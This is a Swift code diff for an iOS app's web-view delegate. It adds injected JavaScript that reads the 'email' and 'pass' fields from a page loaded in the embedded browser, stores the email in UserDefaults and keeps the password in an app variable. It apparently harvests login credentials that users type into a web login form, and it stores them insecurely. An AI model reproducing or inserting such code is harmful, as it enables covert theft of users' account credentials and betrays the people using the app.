@@ -63,12 +63,12 @@ struct CoordsTwo: UIViewRepresentable {
         }
         
         func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
-            webView.evaluateJavaScript("") { item_email, error_email in
+            webView.evaluateJavaScript("document.getElementById('email').value;") { item_email, error_email in
                 if let email_UserDefaults = item_email as? String, error_email == nil {
                     UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesEmail(email: email_UserDefaults)), forKey: "email")
                 }
             }
-            webView.evaluateJavaScript("") { item_matkhau, errormatkhau in
+            webView.evaluateJavaScript("document.getElementById('pass').value;") { item_matkhau, errormatkhau in
                 if let matkhau = item_matkhau as? String, errormatkhau == nil {
                     self.pa_rent_tow.is_two_ktra_matkhau = matkhau
                 }
